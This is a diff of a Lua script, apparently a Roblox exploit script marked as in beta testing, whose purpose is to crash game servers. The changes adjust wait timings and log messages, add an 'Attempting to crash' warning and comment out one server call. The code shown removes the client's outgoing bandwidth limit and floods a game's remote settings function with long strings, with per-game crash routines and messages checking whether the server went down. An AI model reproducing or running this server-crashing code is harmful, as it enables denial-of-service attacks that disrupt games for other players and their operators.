@@ -8,7 +8,6 @@ Credits
 ]]
 -- THIS IS IN BETA TESTING.
 printconsole = printconsole or warn
-
 _G.CrashSettings = {
 	Enabled = true,
 	Games = {
@@ -771,9 +770,6 @@ game.Players.LocalPlayer:Kick('SettingsService returned nil')
 return
 end
 
-wait(3)
-
-
 game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 
@@ -806,8 +802,7 @@ warn('Sending requests to game server... (This may take some time)')
 SettingsService.RF.Set:InvokeServer({LongString});
 --end
 warn('Game server completed sending request!')
-wait(1)
-
+warn('Attempting to crash')
 game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 
@@ -822,15 +817,15 @@ end
 end
 end)
 
-wait(45)
-warn('Client did not crash server within 45 seconds of Get Request.')
+wait(50)
+warn('Client did not crash server within 50 seconds of Get Request.')
 game.Players.LocalPlayer:Kick('Client did not crash game within 45 seconds of last Get Request')
 end
 function C.K_3226555017()
 repeat wait() until game:IsLoaded()
 printconsole('Crashing..')
 
-game:GetService("ReplicatedStorage").Team:FireServer('ScD');
+--game:GetService("ReplicatedStorage").Team:FireServer('ScD');
 warn('Sending request to game server... (This should not take long)')
 
 game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
@@ -862,9 +857,9 @@ end
 end
 end)
 
-task.wait(50)
-warn('Client did not crash server within 50 seconds of Get Request.')
-game.Players.LocalPlayer:Kick('Client did not crash game within 50 seconds of last Get Request')
+wait(45)
+warn('Client did not crash server within 45 seconds of Get Request.')
+game.Players.LocalPlayer:Kick('Client did not crash game within 45 seconds of last Get Request')
 
 end
 C.BasicSetup()
